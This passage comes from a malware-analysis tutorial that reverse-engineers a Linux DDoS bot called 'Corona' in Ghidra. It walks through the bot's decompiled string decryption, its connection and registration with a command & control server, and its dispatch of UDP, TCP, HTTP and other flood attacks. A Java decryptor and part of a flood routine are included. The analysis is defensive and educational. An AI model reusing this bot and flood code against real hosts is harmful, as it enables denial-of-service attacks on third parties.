htonl(0x7f000001);\n   ensure_bind(localhost);\n  }\n  else {\n   if (bindResult == -1) {\n    exit(1);\n   }\n   listen(__fd,1);\n  }\n }\n return;\n}\n\n## String decryption\n\n```\nThe encryption_init is a simple function, in the sense that it calls the same function\n(encryption) several times, before it returns. The code is given below.\n\n\n-----\n\n```\nvoid encryption_init(void)\n{\n encryption(enc_udp,2,&DAT_00407cf7);\n encryption(enc_tcp,2,&DAT_00407cfb);\n encryption(enc_http,2,&DAT_00407cff);\n encryption(enc_std,2,&DAT_00407d04);\n encryption(enc_xmas,2,&DAT_00407d08);\n encryption(enc_vse,2,&DAT_00407d0d);\n encryption(enc_proc_kill,2,\"A*A*t)sB&&uDx\");\n encryption(enc_name,2,\"oDwD$*\");\n encryption(enc_unknown,2,\"x$s$Dt$\");\n return;\n}\n\n```\nThe encryption function (with comitted locals) is given below.\n\n\n-----\n\n```\nvoid encryption(undefined8 puParm1,int iParm2,char pcParm3)\n{\n char cVar2;\n ulong uVar2;\n ulong uVar3;\n char *pcVar4;\n char *pcVar3;\n int local_20;\n int local_1c;\n uint local_18;\n int local_14;\n int local_10;\n uint local_c;\n char cVar1;\n if (iParm2 == 1) {\n  local_20 = 0;\n  local_1c = 0;\n  *puParm1 = 0;\n  do {\n   uVar2 = 0xffffffffffffffff;\n   pcVar4 = pcParm3;\n   do {\n    if (uVar2 == 0) break;\n    uVar2 = uVar2 - 1;\n    cVar1 = *pcVar4;\n    pcVar4 = pcVar4 + 1;\n   } while (cVar1 != 0);\n   if (~uVar2 - 1 <= (ulong)(long)local_20) {\n    *(undefined *)((long)local_1c + (long)puParm1) = 0;\n    return;\n   }\n   local_18 = 0;\n   while (local_18 < 0x41) {\n    if (pcParm3[(long)local_20] == dec[(long)(int)local_18]) {\n     *(undefined *)((long)local_1c + (long)puParm1) = enc[(long)(int)local_18];\n     local_1c = local_1c + 1;\n    }\n    local_18 = local_18 + 1;\n   }\n   local_20 = local_20 + 1;\n  } while( true );\n }\n if (iParm2 != 2) {\n  return;\n }\n local_14 = 0;\n local_10 = 0;\n *puParm1 = 0;\n do {\n  uVar3 = 0xffffffffffffffff;\n  pcVar3 = pcParm3;\n  do {\n   if (uVar3 == 0) break;\n   uVar3 = uVar3 - 1;\n\n```\n\n-----\n\n```\n   cVar2 pcVar3;\n   pcVar3 = pcVar3 + 1;\n  } while (cVar2 != 0);\n  if (~uVar3 - 1 <= (ulong)(long)local_14) {\n   *(undefined *)((long)local_10 + (long)puParm1) = 0;\n   return;\n  }\n  local_c = 0;\n  while (local_c < 0x41) {\n   if (pcParm3[(long)local_14] == enc[(long)(int)local_c]) {\n    *(undefined *)((long)local_10 + (long)puParm1) = dec[(long)(int)local_c];\n    local_10 = local_10 + 1;\n   }\n   local_c = local_c + 1;\n  }\n  local_14 = local_14 + 1;\n } while( true );\n}\n\n```\nWhen looking at the encryption function, it is apparent that the second parameter is used to\nexecute a part of the function. Below, the code structure is highlighted.\n```\nif (iParm2 == 1) {\n //Do something\n}\nif (iParm2 != 2) {\n return;\n}\n//Do something else\n\n```\nThe compiler generates the above given structure based on an if-else structure, as shown\nbelow.\n```\nif (iParm2 == 1) {\n //Do something\n} else if (iParm2 == 2) {\n //Do something else\n}\n\n```\nIn all occurences, the value 2 is used for the second parameter. Therefore, one can assume\nthat the second parameter defines the mode that is used within the function. The first\nparameter is a global string, whereas the third parameter is a literal string. Based on these\nobservations, the signature of the encryption function can be represented as follows.\n```\nencryption(char *output, int mode, char *input);\n\n```\nAside from renaming the three variables in Ghidra, the type of the first variable also needs to\nbe redefined. Instead of undefined8, the type is a char *. To decrypt the strings, one ony has\nto look at the code that is executed when the mode is equal to 2. The code segment is given\nbelow, after which it will be optimised and rewritten in Java.\n\n\n-----\n\n```\n local_14 0;\n local_10 = 0;\n *(undefined8 *)output = 0;\n do {\n  uVar3 = 0xffffffffffffffff;\n  pcVar3 = input;\n  do {\n   if (uVar3 == 0) break;\n   uVar3 = uVar3 - 1;\n   cVar2 = *pcVar3;\n   pcVar3 = pcVar3 + 1;\n  } while (cVar2 != 0);\n  if (~uVar3 - 1 <= (ulong)(long)local_14) {\n   output[(long)local_10] = 0;\n   return;\n  }\n  local_c = 0;\n  while (local_c < 0x41) {\n   if (input[(long)local_14] == enc[(long)(int)local_c]) {\n    output[(long)local_10] = dec[(long)(int)local_c];\n    local_10 = local_10 + 1;\n   }\n   local_c = local_c + 1;\n  }\n  local_14 = local_14 + 1;\n } while( true );\n\n```\nThe variable uVar3 is made equal to 0xffffffffffffffff in the decompiler. When looking in the\ndisassembly, one can see that the value is actually -1.\n```\n0040217b         MOV    uVar3,-0x1\n\n```\nThe decryption code seems to be rather complete based on the decompiled code. However,\nthere are a few parts that are not optimised. The variables enc and dec are two arrays, both\nof which are 64 bytes in size.\n\nThe second do-while loop looks more complicated than it is. The code is given below.\n```\nuVar3 = -1; //Written as 0xffffffffffffffff in the decompiled code\npcVar3 = input;\ndo {\n if (uVar3 == 0) break;\n uVar3 = uVar3 - 1;\n cVar2 = *pcVar3;\n pcVar3 = pcVar3 + 1;\n} while (cVar2 != 0);\nif (~uVar3 - 1 <= (ulong)(long)local_14) {\n//[omitted code]\n\n```\nThe loop is broken when uVar3 (a copy of input) is equal to 0, or when cVar2 is not equal to\n_0. A string is terminated with a NULL byte, meaning that the loop is only broken when the_\nend of the input string has been reached.\n\n\n-----\n\nWithin the loop, uVar3 is decreased with 1 in each iteration. The variable cVar2 is set equal\nto the current address of pcVar3, after which pcVar3‘s value is incremented with one. This\neffectively moves cVar2 to the next character of the string in the next iteration.\n\nBased on this, the code can be rewritten as follows:\n```\ncount = -1; //Written as 0xffffffffffffffff in the decompiled code\ninput_copy = input;\ndo {\n if (count == 0) break;\n count = count - 1;\n currentCharacter = *input_copy;\n input_copy = input_copy + 1;\n} while (currentCharacter != 0);\nif (~count - 1 <= (ulong)(long)local_14) {\n//[omitted code]\n\n```\nThe count starts at -1 and is decreased with 1 for every character that the input is long. The\nif-statement in the line below inverts the value of count, after which 1 is subtracted. The initial\nvalue of the variable is -1, after which the inverse value is decreased with 1. These two\nactions negate eachother, meaning that they can both be left out. The variable count is thus\nequal to 0 in the beginning. When the loop has finished, count is equal to the length of the\n_input string._\n\nOn can write this as a single line of code to increase the readability. The code below is in\nJava.\n```\nint count = input.length;\n\n```\nThe if-statement contains two variables: count and local_14. The latter is increased with 1 at\nthe bottom of the function. This variable can therefore be renamed to iterationCount.\n\nThe if-statement’s body sets the value at output[local_10] to 0, after which the function\nreturns. This part of the code is only reached when the string is fully decrypted, since this is\nthe only way to return from this endless loop.\n\nIn the end of the function, there is a while-loop that contains the two variables that have not\nbeen renamed yet.\n```\nlocal_c = 0;\nwhile (local_c < 0x41) {\n if (input[(long)iterationCount] == enc[(long)(int)local_c]) {\n     output[(long)local_10] = dec[(long)(int)local_c];\n     local_10 = local_10 + 1;\n }\n local_c = local_c + 1;\n}\n\n```\n\n-----\n\nDue to the compiler s assembly code, Ghidra shows this is a while-loop. It is likely that in the\nsource code, the while-loop was actually a for-loop where local_c was named i. Renaming\nthis variable creates code that is more readable. To increase the readability even more, one\ncan rename local_10 to j.\n\nNote that the for-loop iterates 0x41 (65 in decimal) times. In Java, the string terminator (a\nsingle byte at the end of the string that is equal to 0x00) does not exist. Therefore the loop\nshould only iterate 0x40 (64 in decimal) times.\n\nAlso note that the string that is required for the input, requires an additional 0 at the end,\nsince the other loops expect the string terminator to be present.\n\nThe byte arrays named enc and dec can be copied into the decryption program. The\noptimised output can then be used to decrypt the given strings. The Java program to decrypt\na given string is given below.\n\n\n-----\n\n```\n/\n * Decrypts a given <code>input</code> string, after which the decrypted\n * output is printed.\n *\n * @author Max 'Libra' Kersten [@Libranalysis]\n */\npublic static void main(String[] args) {\n //Gets the enc variable that is declared below\n byte[] enc = getEnc();\n //Gets the dec variable that is declared below\n byte[] dec = getDec();\n //The byte array to store the output in. In this sample, there is no string that\nexceeds the size of 100 bytes\n byte[] output = new byte[100];\n //The input which needs to be decrypted (note the \"0\" at the end to include the\nnull byte in the iterations\n byte[] input = \"x$s$Dt$0\".getBytes();\n //The start of the decryption routine\n int iterationCount = 0;\n int j = 0;\n do {\n  if (input.length <= iterationCount) {\n   output[j] = 0;\n   System.out.println(new String(output));\n   return;\n  }\n  for (int i = 0; i < 64; i++) { //0x41 equals 65, but needs to be 64 in Java\nbecause the null terminator byte is not present\n   if (input[iterationCount] == enc[i]) {\n    output[j] = dec[i];\n    j++;\n   }\n  }\n  iterationCount++;\n } while (true);\n}\nprivate static byte[] getEnc() {\n return new byte[]{0x3c, 0x3e, 0x40, 0x5f, 0x3b, 0x3a, 0x2c, 0x2e, 0x2d, 0x2b, 0x2a,\n0x5e, 0x3f, 0x3d, 0x29, 0x28, 0x7c, 0x41, 0x42, 0x26, 0x25, 0x24, 0x44, 0x60, 0x21,\n0x77, 0x6b, 0x79, 0x78, 0x7a, 0x76, 0x75, 0x74, 0x73, 0x72, 0x71, 0x70, 0x6f, 0x6e,\n0x6d, 0x6c, 0x69, 0x68, 0x67, 0x66, 0x65, 0x64, 0x63, 0x62, 0x61, 0x7e, 0x31, 0x32,\n0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x46, 0x55, 0x43, 0x4b};\n}\nprivate static byte[] getDec() {\n return new byte[]{0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61,\n0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71,\n0x72, 0x73, 0x74, 0x75, 0x76, 0x7a, 0x79, 0x77, 0x6b, 0x78, 0x41, 0x42, 0x43, 0x44,\n0x45, 0x46, 0x47, 0x48, 0x49, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54,\n0x55, 0x56, 0x5a, 0x59, 0x57, 0x4b, 0x58, 0x7c, 0x3a, 0x2e, 0x20};\n}\n\n```\nWith this program, one can obtain the original values of the encrypted strings. Below, the\n_encryption init function is given where the decrypted value is given as a comment_\n\n\n-----\n\n```\nencryption(enc_udp,2, 3nb ); //UDP\nencryption(enc_tcp,2,\"2ob\"); //TCP\nencryption(enc_http,2,\"h22b\"); //HTTP\nencryption(enc_std,2,\"12n\"); //STD\nencryption(enc_xmas,2,\"9eq1\"); //XMAS\nencryption(enc_vse,2,\"41m\"); //VSE\nencryption(enc_proc_kill,2,\"A*A*t)sB&&uDx\"); //hahawekillyou\nencryption(enc_name,2,\"oDwD$*\"); //Corona\nencryption(enc_unknown,2,\"x$s$Dt$\"); //unknown\n\n## Testing the internet connection\n\n```\nAfter the strings have been decrypted, the command line argument is saved, the name of the\nparent process is changed, and the random seed has been set, the connection function is\nreached. The code is given below.\n```\nundefined8 connection(void)\n{\n uint uVar1;\n int iVar2;\n sa_family_t local_18;\n uint16_t local_16;\n in_addr_t local_14;\n while( true ) {\n  uVar1 = fcntl(MainSockFD,3,0);\n  fcntl(MainSockFD,4,\n     (ulong)(uVar1 & 0xffff0000 | (uint)CONCAT11((char)((ulong)uVar1 >> 8),\n(char)uVar1)) |\n     0x800);\n  MainSockFD = socket(2,1,0);\n  local_18 = 2;\n  local_16 = htons((uint16_t)bot_port);\n  local_14 = inet_addr(bot_host);\n  iVar2 = connect(MainSockFD,(sockaddr *)&local_18,0x10);\n  if (iVar2 != -1) break;\n  printf(\"[%s] Unable To Connect! \\n\",enc_name);\n  sleep(5);\n }\n printf(\"[%s] Succesfully Connected! \\n\",enc_name);\n registermydevice();\n return 0;\n}\n\n```\nNote that the local_18 variable is of the sa_family_t type. Below, there are three variables\n(local_18, local_16, and local_14) that are actually fields within the sockaddr_in struct.\nChanging the type will show the correct decompiled code. Additionally, the name of local_18\ncan be changed into socketAddr.\n\nBased on the print statements, one can deduce that this function is a connectivity test. At\nfirst, an AF_INET _SOCK_STREAM socket with a default protocol is created. After that, a_\nconnection is initiated based upon the data within the sockaddr in structure Both the\n\n\n-----\n\naddress and the port that the bot will connect to, are located within the data segment.\n\nPort 20 is generally used to transfer files using the File Transfer Protocol (FTP), although this\nis not the case in this bot. The IP address to connect to is 91[.]209[.]70[.]22.\n\nWhen the [connect function fails, the return value is equal to -1. The variable iVar2 is equal to](https://linux.die.net/man/2/connect)\nthe connectionResult and can be renamed as such. The renamed and retyped function is\ngiven below.\n```\nundefined8 connection(void)\n{\n uint uVar1;\n int connectionResult;\n sockaddr_in socketAddr;\n while( true ) {\n  uVar1 = fcntl(MainSockFD,3,0);\n  fcntl(MainSockFD,4,\n     (ulong)(uVar1 & 0xffff0000 | (uint)CONCAT11((char)((ulong)uVar1 >> 8),\n(char)uVar1)) |\n     0x800);\n  MainSockFD = socket(AF_INET,SOCK_STREAM,0);\n  socketAddr.sin_family = 2;\n  socketAddr.sin_port = htons((uint16_t)_bot_port);\n  socketAddr.sin_addr = inet_addr(bot_host);\n  connectionResult = connect(MainSockFD,(sockaddr *)&socketAddr,0x10);\n  if (connectionResult != -1) break;\n  printf(\"[%s] Unable To Connect! \\n\",enc_name);\n  sleep(5);\n }\n printf(\"[%s] Succesfully Connected! \\n\",enc_name);\n registermydevice();\n return 0;\n}\n\n```\nThe main socket is used to connect to the command & control server. If the connection is not\nmade successfully, the bot prints the failure message, sleeps for 5 seconds, and then tries to\nconnect the command & control server again. Upon a successfull connection, the endless\nloop is broken, the success message is printed, and the registermydevice function is called.\n\n## Registering the bot\n\nAfter the connection has been made successfully, the bot is registered. The function is given\nbelow.\n\n\n-----\n\n```\nvoid registermydevice(void)\n{\n char cVar2;\n undefined8 uVar2;\n ulong uVar3;\n ulong uVar4;\n char *pcVar5;\n char *pcVar4;\n char acStack632 [512];\n char acStack120 [112];\n char cVar1;\n uVar2 = getBuild();\n sprintf(acStack120,\"arch %s\\r\\n\",uVar2);\n uVar3 = 0xffffffffffffffff;\n pcVar5 = acStack120;\n do {\n  if (uVar3 == 0) break;\n  uVar3 = uVar3 - 1;\n  cVar1 = *pcVar5;\n  pcVar5 = pcVar5 + 1;\n } while (cVar1 != 0);\n write(MainSockFD,acStack120,~uVar3 - 1);\n uVar2 = getBuild();\n sprintf(acStack632,\n     \"\\x1b[0m\\x1b[0;31m[\\x1b[0;36m%s\\x1b[0;31m]\\x1b[0m Device Joined [Host:%s]\n[Arch:%s][Name:%s]\\x1b[0m\\r\\n\"\n    ,enc_name,0x510068,uVar2,0x510004);\n uVar4 = 0xffffffffffffffff;\n pcVar4 = acStack632;\n do {\n  if (uVar4 == 0) break;\n  uVar4 = uVar4 - 1;\n  cVar2 = *pcVar4;\n  pcVar4 = pcVar4 + 1;\n } while (cVar2 != 0);\n write(MainSockFD,acStack632,~uVar4 - 1);\n return;\n}\n\n```\nIn this function there are two do-while loops. Both of them are similar to a structure that was\nseen in the decryption function, and both are used to obtain the length of a given string.\n\nAt first, the variable uVar2 is set equal to the return value of getBuild, which is given below.\n```\nundefined * getBuild(void)\n{\n return &DAT_00407d3d;\n}\n\n```\nWhen viewing the location of DAT_00496d3d, one can see it is a null terminated string. As\nsuch, the type can be changed to a char *. Ghidra will make use of the new type, as the\n_getBuild function changes after this as can be seen below_\n\n\n-----\n\n```\nchar getBuild(void)\n{\n return \"x86\";\n}\n\n```\nAdditionally, the variable type of uVar2 is changed to a character pointer. The variable uVar2\ncan be renamed into architecture.\n\nThe function contains two calls to the write function, sending two pieces of information\ntowards the command & control server. The creation of the first message, as well as the\nwrite call, is given below.\n```\narchitecture = getBuild();\nsprintf(acStack120,\"arch %s\\r\\n\",architecture);\nuVar3 = 0xffffffffffffffff;\npcVar3 = acStack120;\ndo {\n if (uVar3 == 0) break;\n uVar3 = uVar3 - 1;\n cVar1 = *pcVar3;\n pcVar3 = pcVar3 + 1;\n} while (cVar1 != 0);\nwrite(MainSockFD,acStack120,~uVar3 - 1);\n\n```\nAt first, the architecture variable is filled, after which the acStack120 variable is used as a\nbuffer to store arch x86\\r\\n in. After that, a copy of the buffer is made to calculate the length\nof the input string. At last, the main socket is used to send the buffer with the given length to\nthe command & control server. The refactored code is given below.\n```\narchitecture = getBuild();\nsprintf(architectureBuffer,\"arch %s\\r\\n\",architecture);\narchBufferLength = 0xffffffffffffffff;\narchBufferCopy = architectureBuffer;\ndo {\n if (archBufferLength == 0) break;\n archBufferLength = archBufferLength - 1;\n currentArchChar = *archBufferCopy;\n archBufferCopy = archBufferCopy + 1;\n} while (currentArchChar != 0);\nwrite(MainSockFD,architectureBuffer,~archBufferLength - 1);\n\n```\nThe second write call contains a different buffer with a different length. The code is given\nbelow.\n\n\n-----\n\n```\npcVar2 getBuild();\nsprintf(acStack632,          \n    \"\\x1b[0m\\x1b[0;31m[\\x1b[0;36m%s\\x1b[0;31m]\\x1b[0m Device Joined [Host:%s]\n[Arch:%s][Name:%s]\\x1b[0m\\r\\n\"\n   ,enc_name,0x510068,pcVar2,0x510004);\nuVar3 = 0xffffffffffffffff;\npcVar4 = acStack632;\ndo {\n if (uVar3 == 0) break;\n uVar3 = uVar3 - 1;\n cVar1 = *pcVar4;\n pcVar4 = pcVar4 + 1;\n} while (cVar1 != 0);\nwrite(MainSockFD,acStack632,~uVar3 - 1);\n\n```\nThe acStack632 variable contains the final value to be sent to the command & control server.\nThe code below that is used to calculate the length of the string. The string that is created,\ncontains more information on the infected device. It contains the name (which equals\n_Corona), the value at 0x510068, the architecture (which is stored in pcVar2 and obtained_\nfrom getBuild), and the value at 0x510004.\n\nWhen double clicking on the two addresses, one can see that the values reside within the\n_myinfo struct. The value at 0x510068 is equal to myinfo.local_addres, which was set within_\nthe local_addr function. The value at 0x510004 is equal to myinfo.command_line_argument,\nwhich was set within the main function.\n\nAt last, the length of the string is calculated in a loop, after which the data is sent to the\ncommand & control server using the main socket. Below, the refactored code is given.\n```\nbot_architecture = getBuild();\nsprintf(messageBuffer,          \n    \"\\x1b[0m\\x1b[0;31m[\\x1b[0;36m%s\\x1b[0;31m]\\x1b[0m Device Joined [Host:%s]\n[Arch:%s][Name:%s]\\x1b[0m\\r\\n\"\n    ,enc_name,0x510068,bot_architecture,0x510004);\nmessageLength = 0xffffffffffffffff;\nmessageCopy = messageBuffer;\ndo {\n if (messageLength == 0) break;\n messageLength = messageLength - 1;\n currentMessageChar = *messageCopy;\n messageCopy = messageCopy + 1;\n} while (currentMessageChar != 0);\nwrite(MainSockFD,messageBuffer,~messageLength - 1);\n\n## Parsing a command\n\n```\nAfter the bot has been registered, it will await a command from the command & control\nserver. The code below parses the incoming commands.\n\n\n-----\n\n```\nvoid recv_buf(void)\n{\n long lVar3;\n char *pcVar4;\n ssize_t sVar5;\n ulong uVar6;\n char *pcVar1;\n char *local_488 [12];\n char local_428 [1024];\n int local_28;\n uint local_24;\n char *local_20;\n char cVar1;\n uint uVar2;\n do {\n  sVar5 = read(MainSockFD,local_428,0x400);\n  if (sVar5 == 0) {\n   return;\n  }\n  local_24 = 0;\n  memset(local_488,0,0x58);\n  local_20 = strtok(local_428,\" \");\n  while ((local_20 != (char *)0x0 && ((int)local_24 < 10))) {\n   uVar6 = 0xffffffffffffffff;\n   pcVar1 = local_20;\n   do {\n    if (uVar6 == 0) break;\n    uVar6 = uVar6 - 1;\n    cVar1 = *pcVar1;\n    pcVar1 = pcVar1 + 1;\n   } while (cVar1 != 0);\n   pcVar1 = (char *)malloc(~uVar6);\n   local_488[(long)(int)local_24] = pcVar1;\n   lVar3 = (long)(int)local_24;\n   strcpy(local_488[lVar3],local_20);\n   local_20 = strtok((char *)0x0,\" \");\n   local_24 = local_24 + 1;\n  }\n  pcVar4 = strstr(local_428,enc_proc_kill);\n  if (pcVar4 != (char *)0x0) {\n   exit(0);\n  }\n  if (0 < (int)local_24) {\n   cmd_parse((ulong)local_24,local_488);\n  }\n  local_28 = 0;\n  while (local_28 < (int)local_24) {\n   free(local_488[(long)local_28]);\n   local_28 = local_28 + 1;\n  }\n } while( true );\n}\n\n```\n\n-----\n\nAt first the size of the incoming message is read from the main socket and stored in sVar5.\nThe actual data itself is stored in local_428. The variable named sVar5 can be renamed into\n_commandLength. The variable named local_428 can be renamed into command._\n\nIf the size is equal to 0, meaning no message has been sent to the bot, the function will\nreturn.\n\nWhen the size of the command is not equal to zero, the variable local_24 is set to 0 and a\nbuffer of 88 bytes (0x58 in hexadecimal) is alloacted, which is named local_48. When looking\nin the variable declaration at the top of the function, one will see that local_488 appears to be\na character array of 12 in size, whilst 88 bytes are allocated in size.\n\nTo change the size in Ghidra’s decompiler, one has to retype the variable, as the size is\nincluded in the type. One can change the size by changing char *[12] into char *[88]. After\nchanging the size, commit the local variables again.\n\nSince the function’s content has been changed, some variables are automatically renamed\nby Ghidra. The variable that was previously named command has been renamed to\n_[local_488 and is now used as an argument in the read and memset functions. It can be](https://linux.die.net/man/3/read)_\nrenamed into command again.\n\nThe first part of the function is given below in refactored form.\n```\ndo {\n commandLength = read(MainSockFD,command + 0xc,0x400);\n if (commandLength == 0) {\n  return;\n }\n local_24 = 0;\n memset(command,0,0x58);\n //[...]\n\n```\nBelow that, the [strok function is used to split the command (at offset 0xc) into different parts,](https://www.tutorialspoint.com/c_standard_library/c_function_strtok.htm)\nbased on the used delimiter, which is a space.\n```\nlocal_20 = strtok((char *)(command + 0xc),\" \");\n\n```\nAs such, the local_20 variable can be renamed to splittedCommand.\n\nThe while-loop below contains a string length calculation loop that was observed multiple\ntimes before.\n\n\n-----\n\n```\nwhile ((splittedCommand ! (char )0x0 && ((int)local_24 < 10))) {\n uVar6 = 0xffffffffffffffff;\n pcVar1 = splittedCommand;\n do {\n  if (uVar6 == 0) break;\n  uVar6 = uVar6 - 1;\n  cVar1 = *pcVar1;\n  pcVar1 = pcVar1 + 1;\n } while (cVar1 != 0);\n pcVar2 = (char *)malloc(~uVar6);\n command[(long)(int)local_24] = pcVar2;\n lVar3 = (long)(int)local_24;\n strcpy(command[lVar3],splittedCommand);\n splittedCommand = strtok((char *)0x0,\" \");\n local_24 = local_24 + 1;\n}\n\n```\nThe variable uVar6 is equal to -1, but the decompiler displays the unsigned value as a signed\none. Keep this in mind during the analysis.\n\nAt the bottom of the loop, one can see that the local_24 variable is incremented with one just\nbefore the next iteration starts. Within the while-condition, a comparison is made to see if the\nthe value of local_24 is less than 10. Since the local_24 variable is set to 0 before, this\nmeans that the loop iterates 10 times. The local_24 variable can be renamed to i.\n\nWhen renaming the string length loop, the code becomes much more readable, as can be\nseen below. Additionally, the lVar3 variable can be renamed into i_also, as it is made equal\nto i (local_24 in the code above).\n```\nwhile ((splittedCommand != (char *)0x0 && ((int)i < 10))) {\n splittedCommandLength = 0xffffffffffffffff;\n splittedCommandCopy = splittedCommand;\n do {\n     if (splittedCommandLength == 0) break;\n     splittedCommandLength = splittedCommandLength - 1;\n     currentChar = *splittedCommandCopy;\n     splittedCommandCopy = splittedCommandCopy + 1;\n } while (currentChar != 0);\n pcVar1 = (char *)malloc(~splittedCommandLength);\n command[(long)(int)i] = pcVar1;\n i_also = (long)(int)i;\n strcpy(command[i_also],splittedCommand);\n splittedCommand = strtok((char *)0x0,\" \");\n i = i + 1;\n}\n\n```\nThe variable pcVar1 is equal to a buffer that has the size of the command. After some\njuggling with variables, the splitted command is copied into the command variable. The\nvariable pcVar1 can be renamed into command_copy.\n\nThe last part of the function within the endless loop is given below.\n\n\n-----\n\n```\npcVar4 strstr((char )(command + 0xc),enc_proc_kill);\nif (pcVar4 != (char *)0x0) {\n exit(0);\n}\nif (0 < (int)i) {\n cmd_parse((ulong)i,command);\n}\nlocal_28 = 0;\nwhile (local_28 < (int)i) {\n free(command[(long)local_28]);\n local_28 = local_28 + 1;\n}\n\n```\nThe [strstr function is used to find a string within a given buffer. The buffer is the first](https://www.tutorialspoint.com/c_standard_library/c_function_strstr.htm)\nargument, whereas the second argument is the string to find. In this case, the buffer is\nsearched for value of enc_proc_kill, which equals hahawekillyou. If this string does occur\n(the code states that the condition should not not happen), the bot shuts itself down. If the\nvalue is not present and the amount of loops above is more than 0, the cmd_parse function\nis called with i and command as arguments.\n\n[If this condition is not met, or when the cmd_parse function returns, a while-loop that frees](https://www.tutorialspoint.com/c_standard_library/c_function_free.htm)\ndata is encountered. The code is given below.\n```\nlocal_28 = 0;\nwhile (local_28 < (int)i) {\n free(command[(long)local_28]);\n local_28 = local_28 + 1;\n}\n\n```\nThe variable local_28 can be renamed into count to increase the readability of the code.\n```\ncount = 0;\nwhile (count < (int)i) {\n free(command[(long)count]);\n count = count + 1;\n}\n\n```\nThe value of command at the index of count is freed. This is done to ensure that the next\niteration of the endless loop does not contain parts of a previously issued command.\n\n## Analysing the command handling\n\nUpon receiving a command from the command & control server, it is processed within the\nbot. The command value is then processed internally, after which the corresponding\nfunctions are executed.\n\nAt first glance, one can instantly rename the function’s two arguments. The first one is equal\nto i and the second one is equal to command. The code after these steps is given below.\n\n\n-----\n\n```\nvoid cmd_parse(int i,char command)\n{\n char *pcVar3;\n char *pcVar4;\n int iVar3;\n uint uVar4;\n uint uVar5;\n uint uVar6;\n uint uVar7;\n __pid_t _Var8;\n int iVar5;\n uint uVar8;\n uint uVar9;\n __pid_t _Var10;\n uint local_b4;\n int local_b0;\n int local_ac;\n char *pcVar1;\n char *pcVar2;\n iVar3 = strcmp(*command,enc_udp);\n if (iVar3 == 0) {\n  if (6 < i) {\n   pcVar1 = command[1];\n   uVar4 = atoi(command[2]);\n   uVar5 = atoi(command[3]);\n   uVar6 = atoi(command[4]);\n   uVar7 = atoi(command[5]);\n   if (i < 7) {\n    local_b4 = 1000;\n   }\n   else {\n    local_b4 = atoi(command[6]);\n   }\n   if (i < 8) {\n    local_b0 = 1000000;\n   }\n   else {\n    local_b0 = atoi(command[7]);\n   }\n   if (i < 9) {\n    local_ac = 0;\n   }\n   else {\n    local_ac = atoi(command[8]);\n   }\n   _Var8 = fork();\n   if (_Var8 == 0) {\n    udp_attack(pcVar1,(ulong)uVar4,(ulong)uVar5,(ulong)uVar6,(ulong)uVar7,\n(ulong)local_b4,\n          local_b0,local_ac);\n   }\n  }\n }\n else {\n\n```\n\n-----\n\n```\n  iVar5 strcmp( command,enc_std);\n  if (iVar5 == 0) {\n   if (2 < i) {\n    pcVar3 = command[1];\n    uVar8 = atoi(command[2]);\n    uVar9 = atoi(command[3]);\n    _Var10 = fork();\n    if (_Var10 == 0) {\n     std_attack(pcVar3,(ulong)uVar8,(ulong)uVar9);\n    }\n   }\n  }\n  else {\n   iVar5 = strcmp(*command,enc_vse);\n   if (iVar5 == 0) {\n    if (i < 3) {\n     return;\n    }\n    pcVar3 = command[1];\n    uVar8 = atoi(command[2]);\n    uVar9 = atoi(command[3]);\n    _Var10 = fork();\n    if (_Var10 == 0) {\n     vse_attack(pcVar3,(ulong)uVar8,(ulong)uVar9);\n     _exit(0);\n    }\n   }\n   iVar5 = strcmp(*command,enc_tcp);\n   if (iVar5 == 0) {\n    if (3 < i) {\n     pcVar3 = command[1];\n     uVar8 = atoi(command[2]);\n     uVar9 = atoi(command[3]);\n     pcVar2 = command[4];\n     _Var10 = fork();\n     if (_Var10 == 0) {\n      tcp_attack(pcVar3,(ulong)uVar8,(ulong)uVar9,pcVar2);\n      _exit(0);\n     }\n    }\n   }\n   else {\n    iVar5 = strcmp(*command,enc_xmas);\n    if (iVar5 == 0) {\n     if (2 < i) {\n      pcVar3 = command[1];\n      uVar8 = atoi(command[2]);\n      uVar9 = atoi(command[3]);\n      _Var10 = fork();\n      if (_Var10 == 0) {\n       xmas_attack(pcVar3,(ulong)uVar8,(ulong)uVar9);\n       _exit(0);\n      }\n     }\n    }\n\n```\n\n-----\n\n```\n    else {\n     iVar5 = strcmp(*command,enc_http);\n     if ((iVar5 == 0) && (3 < i)) {\n      pcVar3 = command[1];\n      uVar8 = atoi(command[2]);\n      uVar9 = atoi(command[3]);\n      pcVar4 = command[4];\n      _Var10 = fork();\n      if (_Var10 == 0) {\n       http_attack(pcVar3,(ulong)uVar8,(ulong)uVar9,pcVar4);\n      }\n     }\n    }\n   }\n  }\n }\n return;\n}\n\n```\nWhen glancing over this function, one can get a clear overview of its structure. Using multiple\nstring compare calls, the given command is compared to multiple types of attacks. Below, a\nshortened version of the structure is given.\n```\nif (strcmp(command, UDP)) {\n  //Execute command\n} else if (strcmp(command, \"UDP\")) {\n     //Execute command\n} else if (strcmp(command, \"STD\")) {\n     //Execute command\n} else if (strcmp(command, \"VSE\")) {\n     //Execute command\n} else if (strcmp(command, \"TCP\")) {\n     //Execute command\n} else if (strcmp(command, \"XMAS\")) {\n     //Execute command\n} else if (strcmp(command, \"HTTP\")) {\n     //Execute command\n}\n\n```\nBased on the amount of parameters that some attacks require, one can deduce that the size\nof the string array that contains the command ranges between 4 and 9, including the\ncommand itself.\n\nThe easiest way to see what the value of the command fields are, one can analyse a\nfunction. A small one, such as the std_attack function will provide information about the first\nthree arguments. The code is given below after comitting the locals and changing the type of\n_local_48 from sa_family_t to sockaddr_in._\n\n\n-----\n\n```\nvoid std_attack(char pcParm1,uint16_t uParm2,int iParm3)\n{\n int __fd;\n int iVar1;\n void *__buf;\n time_t tVar2;\n time_t tVar1;\n char *pcVar3;\n long lVar4;\n char local_5c;\n sockaddr_in local_48;\n int local_2c;\n void *local_28;\n int local_20;\n int local_1c;\n __buf = malloc(0x400);\n __fd = socket(2,2,0);\n local_48.sin_family = 2;\n local_48.sin_addr = inet_addr(pcParm1);\n local_48.sin_port = htons(uParm2);\n tVar2 = time((time_t *)0x0);\n while( true ) {\n  lVar4 = (long)((int)tVar2 + iParm3);\n  tVar1 = time((time_t *)0x0);\n  if (lVar4 <= tVar1) break;\n  pcVar3 = (char *)((long)__buf + 0x400);\n  iVar1 = rand();\n  